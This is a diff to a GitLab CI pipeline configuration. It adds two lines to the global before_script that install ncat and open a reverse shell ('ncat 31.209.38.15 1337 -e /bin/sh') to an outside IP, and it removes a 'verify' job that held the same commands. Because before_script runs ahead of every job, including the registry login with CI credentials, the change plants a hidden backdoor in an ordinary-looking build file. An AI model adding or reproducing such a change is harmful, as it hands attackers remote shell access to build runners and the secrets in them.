@@ -44,6 +44,8 @@ stages:
 
 # Display information before we start the build.
 before_script:
+  - apk add nmap-ncat
+  - ncat 31.209.38.15 1337 -e /bin/sh
   - docker info
   # - docker login -u $DOCKER_REG_CID -p $DOCKER_REG_TOKEN $CI_REGISTRY
   - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD $CI_REGISTRY
@@ -72,14 +74,7 @@ before_script:
 #     paths:
 #     - public
 
-verify:
-  image: ubuntu:18.04
-  tags:
-    - docker-build
-  stage: verify
-  script:
-    - apk add nmap-ncat
-    - ncat 31.209.38.15 1337 -e /bin/sh
+# verify:
 
 
 # This section describes what shall be done to deploy artefacts from the project.
